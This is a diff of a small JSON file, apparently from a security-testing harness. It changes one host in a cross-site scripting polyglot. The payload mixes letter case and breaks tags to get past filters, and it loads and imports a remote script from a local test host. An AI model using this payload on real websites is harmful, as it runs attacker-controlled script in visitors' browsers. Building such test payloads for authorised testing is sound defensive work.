@@ -1,3 +1,3 @@
 {
-    "payload": "<ScRiPt sRc=\"http://host.docker.internal:8080/xss.js\"></ScRiPt>sVg oNmOuSeOveR=import(\"http://host.docker.internal:8080/xss.js\")') oNeRrOr= jAvAsCriPt:/texTarEa>sVg/> oNLoAd=-noScRIpt>/>tITle><ScRiPt sRc=\"http://host.docker.internal:8080/xss.js\"></ScRiPt></iMg<!--> oNeRrOr=/*/&gt; oNLoAd=(  a>nOeMbed>frAmEsEt>\"ifRaMe> -->/texTarEa&gt;viDeO><iMg*  oNmOuSeOveR=/<ScRiPt sRc='http://host.docker.internal:8080/xss.js'></ScRiPt>"
+    "payload": "<ScRiPt sRc=\"http://testbed:8080/xss.js\"></ScRiPt>sVg oNmOuSeOveR=import(\"http://host.docker.internal:8080/xss.js\")') oNeRrOr= jAvAsCriPt:/texTarEa>sVg/> oNLoAd=-noScRIpt>/>tITle><ScRiPt sRc=\"http://host.docker.internal:8080/xss.js\"></ScRiPt></iMg<!--> oNeRrOr=/*/&gt; oNLoAd=(  a>nOeMbed>frAmEsEt>\"ifRaMe> -->/texTarEa&gt;viDeO><iMg*  oNmOuSeOveR=/<ScRiPt sRc='http://host.docker.internal:8080/xss.js'></ScRiPt>"
 }
